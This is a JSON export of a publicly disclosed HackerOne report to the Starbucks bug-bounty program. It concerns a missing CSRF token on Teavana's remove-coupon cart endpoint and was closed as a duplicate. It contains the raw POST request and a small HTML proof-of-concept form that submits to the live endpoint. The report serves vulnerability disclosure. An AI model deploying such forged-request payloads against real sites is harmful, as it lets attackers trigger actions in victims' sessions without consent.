{"id":227726,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjc3MjY=","url":"https://hackerone.com/reports/227726","title":"Missing CSRF Token On Remove Coupun From Cart","state":"Closed","substate":"duplicate","severity_rating":"low","readable_substate":"Duplicate","created_at":"2017-05-11T16:03:57.693Z","submitted_at":"2017-05-11T16:03:57.693Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"apapedulimu","url":"/apapedulimu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/158/407/aeaf392e2bc7283dea36aa24392b2f2d1ceee72c_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-02-08T19:05:20.751Z","bug_reporter_agreed_on_going_public_at":"2017-05-11T17:31:46.826Z","team_member_agreed_on_going_public_at":"2019-02-08T19:05:20.611Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nWhen remove coupun, there's no CSRF token, at this time i use `███████` Coupun to reproduce it.\n\n__Vuln Request__\n```\nPOST /on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/cart\nContent-Length: 17\nCookie: some cookie\nConnection: close\n\ncouponCode=██████████\n```\n\n__Poc Code__\n```\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cform action=\"https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon\" method=\"POST\"\u003e\n\u003cinput type=\"hidden\" name=\"couponCode\" value=\"███\" /\u003e\n\u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n\u003c/form\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\n```\n\nEdit the `coupunCode` with name of the coupun.\n\nThanks, \n If you need video, i will create one !","vulnerability_information_html":"\u003cp\u003eHi,\u003cbr\u003e\nWhen remove coupun, there\u0026#39;s no CSRF token, at this time i use \u003ccode\u003e███████\u003c/code\u003e Coupun to reproduce it.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eVuln Request\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/cart\nContent-Length: 17\nCookie: some cookie\nConnection: close\n\ncouponCode=██████████\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003ePoc Code\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;couponCode\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;███\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eEdit the \u003ccode\u003ecoupunCode\u003c/code\u003e with name of the coupun.\u003c/p\u003e\n\n\u003cp\u003eThanks, \u003cbr\u003e\n If you need video, i will create one !\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":226088,"original_report_url":"https://hackerone.com/reports/226088","attachments":[],"allow_singular_disclosure_at":null,"vote_count":9,"voters":["apapedulimu","an0nym0us","rugb","khizer47","cyberunit","cr4xerbik4sh","codeanddecode","b73772bded7541989b54f6a","puyadeviba"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":13009,"asset_type":"URL","asset_identifier":"www.teavana.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1668489,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi @apapedulimu, \n\nThank you for your submission. Unfortunately, we had previously been made aware of this issue by another hacker. That being said I will close this as `Duplicate`. \n\nThank you for participating in the Starbucks bug bounty program. We look forward to more reports from you in the future.\n\nBest Regards, \n@overice ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/apapedulimu\"\u003e@apapedulimu\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Unfortunately, we had previously been made aware of this issue by another hacker. That being said I will close this as \u003ccode\u003eDuplicate\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eThank you for participating in the Starbucks bug bounty program. We look forward to more reports from you in the future.\u003c/p\u003e\n\n\u003cp\u003eBest Regards, \u003cbr\u003e\n\u003ca href=\"/overice\"\u003e@overice\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-11T17:27:26.131Z","updated_at":"2017-05-11T17:27:26.131Z","original_report_id":226088,"actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1668502,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-11T17:31:46.852Z","updated_at":"2017-05-11T17:31:46.852Z","first_to_agree":true,"actor":{"username":"apapedulimu","cleared":true,"url":"/apapedulimu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/158/407/aeaf392e2bc7283dea36aa24392b2f2d1ceee72c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1674918,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @apapedulimu, \n\nSince the original report is still unresolved, we are not ready to disclose this issue. However, we'd be happy to disclose it as soon as the original report reaches resolution. Thank you for your patience! \n\nBest Regards, \n@overice ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/apapedulimu\"\u003e@apapedulimu\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eSince the original report is still unresolved, we are not ready to disclose this issue. However, we\u0026#39;d be happy to disclose it as soon as the original report reaches resolution. Thank you for your patience! \u003c/p\u003e\n\n\u003cp\u003eBest Regards, \u003cbr\u003e\n\u003ca href=\"/overice\"\u003e@overice\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-15T16:56:39.094Z","updated_at":"2017-05-15T16:56:39.094Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3694517,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-21T19:54:55.927Z","updated_at":"2018-11-21T19:54:55.927Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"www.teavana.com","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4116621,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-08T19:05:20.644Z","updated_at":"2019-02-08T19:05:20.644Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4116622,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-08T19:05:20.783Z","updated_at":"2019-02-08T19:05:20.783Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}